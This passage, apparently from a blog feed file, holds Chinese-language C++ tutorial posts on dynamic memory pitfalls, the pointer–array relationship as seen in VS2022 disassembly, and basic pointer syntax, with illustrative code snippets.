class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>) * <span class="number">10</span>);</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">250</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p[<span class="number">2</span>] = <span class="number">99</span>;<span class="comment">//编译器不一定会报错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>当内存空间free掉之后，指针指向的内存生命周期到了，没有了。下次程序使用的时候就有可能产生不可预料的错误。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">250</span>;</span><br><span class="line"><span class="keyword">delete</span>[]p;</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">300</span>;<span class="comment">//这段程序就会报错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/07/dynamicsmemory/011.png" class=""><p>会报错是好事，能及时止损。</p><p>还有一种情况就是你的指针备份过了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> *p2 = p;</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">250</span>;</span><br><span class="line"><span class="keyword">delete</span>[]p;</span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">300</span>;<span class="comment">//编译通过了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这玩意也挺狠，利用备份的指针重写，都不知道写到哪去了。</p><hr><h3 id="重复释放"><a href="#重复释放" class="headerlink" title="重复释放"></a>重复释放</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line"><span class="keyword">delete</span> p;</span><br></pre></td></tr></table></figure><p>编译器会给出警告，虽然你释放过了这片区域，但是难免不保证被被人申请到，当别人申请到了之后，你又再来一下释放。。。这不是一种耍流氓行为吗，所以不可取。</p><hr><h3 id="内存碎片"><a href="#内存碎片" class="headerlink" title="内存碎片"></a>内存碎片</h3><p>当程序频繁申请和释放内存，就会导致产生内存碎片</p><img src="/2022/05/07/dynamicsmemory/012.png" class=""><p>虽然释放掉的内存没有被占用，但是无法规避我们后面需要多大的空间。那么这些零散的内存就被称为内存碎片。<br>当然new和delete会尽量规避风险，有能力自己额外注意。</p><hr><h3 id="混用"><a href="#混用" class="headerlink" title="混用"></a>混用</h3><p>malloc申请的内存用delete释放<br>new分配的内存用free释放</p><blockquote><p>底层new就是通过malloc实现的，那么delete也八九不离十是free为原型的<br>但是，new毕竟是c++的产物，所以不建议混用，以免养成不好习惯或不必要的麻烦。</p></blockquote><hr><h2 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h2><p>如果想要将数组复制到new出来的内存上时，最常用就是通过循环赋值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">p[i] = ch[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么c++也有定义好的函数<br><code>void * memcpy(void* _Dst, const void *_Src, size_t_size);</code><br>也就是将src的内存数据复制到dst上，关键是还要指定长度size</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(p, ch, <span class="built_in">sizeof</span>(<span class="type">int</span>) * <span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果不想全复制，那也就是对长度做手脚，修改一下就行。往小了还行，往大了赋值只会越界，后面的内存不归你使用，所以不要傻乎乎玩这么大</strong></p><hr><h2 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h2><p>在经过memcpy之后，如果只复制几个，后面的元素又没有初始化过。就是一堆乱值。<br>memset就是将指定内存区域按每个字节的值都设置起来<br><code>void *memset(void *_Dst,int val,size_t_size);</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br><span class="line"><span class="built_in">memset</span>(p,<span class="number">0</span>,<span class="built_in">sizeof</span>(<span class="type">int</span>)*<span class="number">5</span>);</span><br></pre></td></tr></table></figure><p>for循环打印查看结果：<img src="/2022/05/07/dynamicsmemory/013.png" class=""></p><p>然后就是坏事，因为memset是按照每个字节分配内存。一个字节的范围0-255，十六进制也就0xff。<br>如果val超过了255，可以看看会发生什么。</p><p>val &#x3D; 0xff的情况下：<img src="/2022/05/07/dynamicsmemory/014.png" class=""><br>十进制可能不够明显，我们转换成十六进制输出<code>std::cout &lt;&lt; std::hex &lt;&lt; p[i] &lt;&lt; std::endl;</code></p><img src="/2022/05/07/dynamicsmemory/015.png" class=""> 两个十六进制数一个字节<p>val &#x3D; 0x123456时：<img src="/2022/05/07/dynamicsmemory/016.png" class=""></p><p><strong>所以建议初始化的时候，val设置为0或者0x00，就不要整别的了</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>那么动态内存分配就到此先，凡是需要人去手动构造的都需要格外谨慎。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pointerArray</title>
      <link href="/2022/05/05/pointerArray/"/>
      <url>/2022/05/05/pointerArray/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>分析一下编译器vs2022对数组的访问操作。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>先参照一下视频的分析</p><img src="/2022/05/05/pointerArray/001.png" class=""><p>汇编这玩意，看着看着倒是顺眼了，前提是简单的操作。</p><ol><li>mov eax,4 就是类似于eax&#x3D;4</li><li>imul ecx,eax,0 是 eax*0之后赋值给ecx，不过都乘以0了，ecx也就是0了</li><li>lea edx,[ebp+ecx-1Ch] ecx是0在上一步有说明了，就剩ebp-1Ch的地址传递给edx</li><li>mov dword ptr [ebp-28h],edx 这一步就是将[ebp-28h]的这段空间写入edx，也就是[ebp-1Ch]</li><li>mov eax,dword ptr [ebp-28h] ,这里[ebp-28h]已经写入了之前说的edx的值[ebp-1Ch],相当于eax&#x3D;edx了</li><li>mov dword ptr [eax],5 ，因为之前也说了eax&#x3D;edx，所以这里给eax&#x3D;5，就是变相的给edx&#x3D;5<br>然后回头看，能说什么说明？说明edx的那段内存地址是属于a[0]的，而[ebp-28h]的那段空间就是指针占用的部分，换种写法就是[ebp-28h] &#x3D; [ebp-1Ch] &#x2F; 也就是int *ptrA &#x3D; &amp;a[0];</li></ol><p>不信话看<code>a[0] = 5</code>这段反汇编</p><ol><li>mov eax，4 也就是eax&#x3D;4</li><li>imul ecx,eax,0 也就是ecx &#x3D; exa * 0；</li><li>mov dword ptr [ebp+ecx-1Ch],5 这一步将5传递到[ebp+ecx-1Ch]上，ecx&#x3D;0了，也就是[ebp-1Ch] &#x3D; 5,那么你会发现，在上述分析的时候，int *p &#x3D; &amp;ch[0]，也出现了[ebp-1Ch]，可想而知，[ebp-1Ch] 他就是a[0]占用的地址。</li></ol><p>在看<code>a[1] = 5</code></p><ol><li>mov eax,4</li><li>shl eax,0    ,shl是左位移操作，相当于eax &lt;&lt; 0, 那么向左位移的时候说过，相当于eax * 2^n，这里n&#x3D;0，所以eax * 2^0 ,也就是eax*1，4*1，这里eax还是&#x3D;4；&#x2F;&#x2F;正常情况下左位移一位相当于原数乘以二</li><li>mov dword ptr [ebp+eax-1Ch],5 这里有意思了，虽然看似差不多，但是这个时候eax的值已经是4了，所以ch[1]的地址就是[ebp+4-1Ch]。同理这句话就是[ebp+4-1Ch] &#x3D; 5;</li></ol><p>最后<code>a[2] = 5</code></p><ol><li>mov eax,4 ,eax&#x3D;4</li><li>shl eax,1    ，eax &lt;&lt; 1, eax * 2^1，也就是eax &#x3D; 8</li><li>mov dword ptr [ebp+eax-1Ch] , 也就是[ebp+8-1Ch] &#x3D; 5; 那么a[2]的地址也就是[ebp+8-1Ch]</li></ol><p>往后推a[3]的地址也就是[ebp+12-1Ch],a[4] &#x3D; [ebp+16-1Ch]。<br>所以说数组的地址，都是基于首地址进行一个偏移量，这个偏移量根据类型得出，首地址也就是a[0]<br>看a[1]的时候，[1]就是代表了要进行的偏移量，1*4，那么怎么获取首地址呢，就要靠前面那个a，所以能得出a &#x3D;&#x3D; &amp;a[0]的结论。<br>实际测试效果一致</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;a[<span class="number">0</span>] &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/05/pointerArray/002.png" class=""><p>看到地址确实是一样的。那么论证a &#x3D;&#x3D; &amp;a[0]是成立的。也就是说当指针指向一个数组首地址的时候，可以直接<code>int *p = a</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> *p&#123; &amp;ch[<span class="number">0</span>] &#125;;</span><br><span class="line"></span><br><span class="line">*p = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">ch[<span class="number">0</span>] = <span class="number">5</span>;</span><br><span class="line">ch[<span class="number">1</span>] = <span class="number">50</span>;</span><br><span class="line">ch[<span class="number">2</span>] = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; ch[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现他俩得值都是一样的：</p><img src="/2022/05/05/pointerArray/003.png" class=""><p>那么反推过来，因为看过了反汇编，发现数组其实就是指针偏移过来的产物。<br>除了特定情况下：比如sizeof的时候，a代表的才是一整个数组，这点我们在学习求数组长度的时候就知道，sizeof(ch)&#x2F;sizeof(ch[0]);但是我们sizeof(p)他只能是4，64位是8。因为本质上指针就是指针，数组是经过包装的。</p><hr><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>多维数组声明的时候就看有几个[]，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> ch[<span class="number">2</span>][<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>][<span class="number">2</span>];</span><br></pre></td></tr></table></figure><p>但是，数组是一片连续的空间，那么多维，就只是人用逻辑结构抽象出来的产物。为什么这么说呢，往下看</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>];</span><br><span class="line"><span class="comment">//ch[0] ch[1] ch[2] ch[3] 。。。。</span></span><br><span class="line"><span class="type">int</span> ch[<span class="number">2</span>][<span class="number">5</span>]</span><br><span class="line"><span class="comment">//ch[0][0] ch[0][1] ch[0][2]。。。</span></span><br><span class="line"><span class="comment">//ch[1][0] ch[1][1] ch[1][2]。。。</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>][<span class="number">2</span>]</span><br><span class="line"><span class="comment">//ch[0][0] ch[0][1]</span></span><br><span class="line"><span class="comment">//ch[1][0] ch[1][1]</span></span><br><span class="line"><span class="comment">//ch[2][0] ch[2][1]</span></span><br><span class="line"><span class="comment">//.......</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2*5&#x3D;10,5*2&#x3D;10,那么物理上，一维和多维可以说是没有什么区别，就是抽象多了一层结构，方便人去阅读和理解。<br>为了更好理解，继续用代码测试：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ch[<span class="number">2</span>][<span class="number">5</span>] = &#123;</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;,</span><br><span class="line">&#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = ch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/05/pointerArray/004.png" class=""><p>会看到提示类型转换有问题，那么老样子强转一波：<code>int *p = (int *)ch;</code></p><img src="/2022/05/05/pointerArray/005.png" class=""> 没问题，那就继续操作。<p>正常情况下访问ch的第九个元素要通过ch[1][3]获取。那我们是否能用p[8]直接访问。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; ch[<span class="number">1</span>][<span class="number">3</span>] &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p[<span class="number">8</span>] &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/05/pointerArray/006.png" class=""><p>发现能正常输出啊，这就恰好论证了我们之前说的在底层中，多维实际上跟一维没有差别。</p><p>但是不是说多维就没用，不然这种逻辑结构就没有存在的意义了，这里只是探究本质。多维在很多地方还是很有用的，几行几列是人最习惯的东西。</p><p>想要指针实现多维的效果也是可以的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p2[<span class="number">5</span>] = ch;    <span class="comment">//不合法，因为这种写法是声明了五个int类型的指针，通常称为指针数组</span></span><br><span class="line"><span class="built_in">int</span>(*p3)[<span class="number">5</span>] = ch;   <span class="comment">//这种写法被称为数组指针，是可以=二维数组的</span></span><br></pre></td></tr></table></figure><img src="/2022/05/05/pointerArray/007.png" class=""><p>发现结果都一样，说明逻辑结构存在了。</p><p>然后我们再看看它们的大小：<img src="/2022/05/05/pointerArray/008.png" class=""><br>发现指针数组的区别在于他是变量类型*[]的数字，而数组指针仍然是一个指针的大小。</p><p>再看看指针数组+1和数组指针+1的区别：<br>数组指针+1的时候：<img src="/2022/05/05/pointerArray/009.png" class=""><br>它们之间相差20，这个20怎么来的，就是变量类型乘以[]的数字得来的，数组指针这种写法会造成特殊的逻辑，*p2看作行，[5]看作列，那么p2每加一个1，他的步长就变成了5。所以不是我们之前说的指针正常+1，就是偏移一个他的变量类型。<br>指针数组我们说了定义就是几个int类型的指针，它每次加一，步长就为变量类型的大小。</p><blockquote><p>这也是一个误区，容易弄混淆的地方，所以要特别注意数组指针和指针数组的使用方式。</p></blockquote><p>然后就是之前说过的一维数组的时候，ch[0]可以表示为数组的首地址，ch同样可以，因为参照的是ch[1~n]都要参照ch作为首地址进行偏移，那么二维数组呢？或者说多维数组，是不是也有相同的操作。</p><p>可以尝试一下,直接打印各自的首地址：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; *p3[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; ch[<span class="number">0</span>][<span class="number">0</span>] &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>发现结果是一样的：<img src="/2022/05/05/pointerArray/010.png" class=""><br>二者的地址也是一样的：<img src="/2022/05/05/pointerArray/012.png" class=""><br>甚至说俩都+1，往后偏移一位，结果也是一样的：<img src="/2022/05/05/pointerArray/011.png" class=""></p><p>所以ch[0][0] 也是要参照前面的ch[0]来偏移获取，故此ch[0] &#x3D;&#x3D; ch[0][0]也得到了论证。</p><hr><h1 id="试试看自己机子反汇编后的"><a href="#试试看自己机子反汇编后的" class="headerlink" title="试试看自己机子反汇编后的"></a>试试看自己机子反汇编后的</h1><p>然后自己先随便写一段：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> *p = &amp;ch[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">*p = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">ch[<span class="number">0</span>] = <span class="number">5</span>;</span><br><span class="line">ch[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">ch[<span class="number">2</span>] = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后老样子随便在一句代码上打个断点进行反汇编：</p><img src="/2022/05/05/pointerArray/000.png" class=""><p>不知道是不是编译器的问题，视频用的2019，我用的2022。x86都是x86，但是在每个mov上操作的不太一样。<br>像视频教学的时候最后赋值是mov dword ptr [ebp+eax-1Ch],5。通过这样的写法能直观的看出规律。和计算出位置。</p><p>而我自己这个2022反汇编出来的，最后赋值的时候却是mov dword ptr ch[eax],5。就感觉有点突兀了。<br>摘自<code>ch[1]=5</code></p><ol><li>eax,4    &#x2F;&#x2F;eax &#x3D; 4 没啥问题</li><li>shl eax,0    &#x2F;&#x2F;eax &lt;&lt; 0, eax &#x3D; 4</li><li>mov dword ptr ch[eax],5  &#x2F;&#x2F;但是这个ch[4] &#x3D; 5就不太现实啊</li></ol><p>怎么说这里eax也应该是1才对，除非你说要除以变量类型，或者说先计算出指针ch的地址在+上eax作为偏移量，这样换算也行。</p><p><strong>后面听群友说要关闭显示符号名</strong></p><img src="/2022/05/05/pointerArray/013.png" class=""><p>看到雀食变成ebp的形式了</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>看起来觉得没啥东西，学起来又绕来绕去，学完了或多或少没记全。。。多用用或许还能避避坑，反正用到了再回头看看。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pointer</title>
      <link href="/2022/05/02/pointer/"/>
      <url>/2022/05/02/pointer/</url>
      
        <content type="html"><![CDATA[<h1 id="c-x2F-c-的万恶之源"><a href="#c-x2F-c-的万恶之源" class="headerlink" title="c&#x2F;c++的万恶之源"></a>c&#x2F;c++的万恶之源</h1><ul><li>指针</li></ul><span id="more"></span><hr><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>指针，是C语言中的一个重要概念及其特点，也是掌握C语言比较困难的部分。指针也就是内存地址，指针变量是用来存放内存地址的变量，在同一CPU构架下，不同类型的指针变量所占用的存储单元长度是相同的，而存放数据的变量因数据的类型不同，所占用的存储空间长度也不同。有了指针以后，不仅可以对数据本身，也可以对存储数据的变量地址进行操作。<br>——摘自百度</p><p>因为运行一个程序，需要消耗内存，程序当中的变量各自有占用的地方，通常以十六进制表示，用visual studio反汇编的时候就能看到前面有一串长的字符。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>不同类型的变量所占用的内存也各不相同，有基础的应该都知道，目前先不说32位操作系统的情况，以64位操作系统为例。</p><blockquote><p>tips:int 类型占用 4字节 &#x3D; 32比特，一个比特可以表示0或者1</p></blockquote><p>指针的要素就是要操作对象的内存地址和大小</p><hr><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据类型* 变量名称；例如：</span></span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line"><span class="comment">//int* p; 都可以，*在前或在后都是表示指针，取决于使用者的习惯。</span></span><br></pre></td></tr></table></figure><hr><h2 id="初试指针"><a href="#初试指针" class="headerlink" title="初试指针"></a>初试指针</h2><p>打开编译器，运行：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p&#123;&#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>vs2019开始变量不初始化会报错，所以我们这里采用int *p{};</p></blockquote><p>可以看到：<img src="/2022/05/02/pointer/000.png" class=""><br>可以看到打印的是多个0，那么接下来可以看看一个其他变量的地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line">p = &amp;a;</span><br><span class="line">    <span class="comment">//直接int *p = &amp;a也无妨</span></span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到结果是一个十六进制的数：<img src="/2022/05/02/pointer/001.png" class=""></p><blockquote><p>为什么要用&amp;呢，在学习C语言scanf语句的时候，我们知道了往一个变量写入值的时候需要知道变量的地址。此处概念相同。<br>其次，指针的类型必须和获取地址的变量类型一致。</p></blockquote><p>有意思的是，这个地址，每次生成程序都会发生改变，</p><img src="/2022/05/02/pointer/002.png" class=""><p>其原因就是因为这个变量是个局部变量，将其提升为全局变量则内存地址固定。</p><p>那么明白了不带*的时候输出就是地址，就可以猜到带*输出时表示为a的值：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/02/pointer/003.png" class=""><p>有聪明的小伙伴就会想到，*p代表值，那么<code>\*p=200</code>是不是就可以修改a的值呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line">p = &amp;a;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line">*p = <span class="number">200</span>;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>ok，结果当然是：<img src="/2022/05/02/pointer/004.png" class=""></p><blockquote><p>tips: 这里也可以不用*p &#x3D; 200, 将a &#x3D; 200；效果也一样</p></blockquote><p>同理，不带*的时候，可以给指针换个地址。但注意<em>不要是非地址以外的东西，并且这个地址是有意义的，避免产生不可预期的后果</em></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line">p = &amp;a;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;b &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p 